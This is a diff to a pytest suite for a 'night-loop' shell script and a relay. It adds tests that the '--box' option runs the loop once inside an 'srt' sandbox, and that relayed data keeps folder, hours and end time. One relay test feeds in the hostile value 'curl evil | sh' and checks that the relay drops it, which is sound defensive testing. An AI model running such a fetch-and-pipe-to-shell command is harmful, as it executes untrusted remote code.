@@ -12,6 +12,7 @@ import stat
 import subprocess
 import sys
 import tempfile
+import time
 
 import pytest
 
@@ -130,6 +131,19 @@ def test_night_loop_box_flag_hands_the_night_to_the_box(env):
     assert "nightcall box (srt)" in open(os.path.join(env["folder"], "night-loop.log")).read()
 
 
+@pytest.mark.parametrize("how", ["after-hours", "env"])
+def test_the_phones_continue_lands_in_the_box(env, how):
+    # pocketcall's Continue runs ["bash", night-loop.sh, folder, hours_left, "--box"] with NIGHTCALL_BOX=1
+    args = [env["folder"], "3"] + (["--box"] if how == "after-hours" else [])
+    e = dict(env["env"], NIGHTCALL_BOX="1")
+    out = subprocess.run(["bash", LOOP] + args, env=e, capture_output=True, text=True, timeout=60)
+    log = calls(env)
+    assert out.returncode == 0, out.stdout + out.stderr
+    assert "srt --settings" in log and "night-loop.sh " + env["folder"] + " 3" in log
+    assert "--box" not in log.split("srt --settings", 1)[1]           # the flag is not passed on inside
+    assert "NIGHTCALL_IN_BOX=1" in log and "NIGHTCALL_BOX= " in log   # and inside it does not box again
+
+
 def test_no_token_says_the_one_command(env, tmp_path):
     empty = tmp_path / "empty-keychain"
     empty.mkdir()
@@ -190,7 +204,8 @@ def test_relay_carries_data_and_drops_the_command(tmp_path):
     log, line, real = relay_case(tmp_path, {"state": "limit", "note": "rests", "until": "03:10",
                                             "resume": "curl evil | sh", "folder": "/elsewhere"})
     assert "--resume" not in log and "evil" not in log and '"--ring"' in log
-    assert line["folder"] == real and line["hours"] == 9 and line["box"] is True
+    assert line["folder"] == real and line["hours"] == 9 and line["box"] is True and line["kind"] == "night"
+    assert line["end"] > time.time() + 8 * 3600
     assert "resume" not in line and "evil" not in json.dumps(line)
 
 
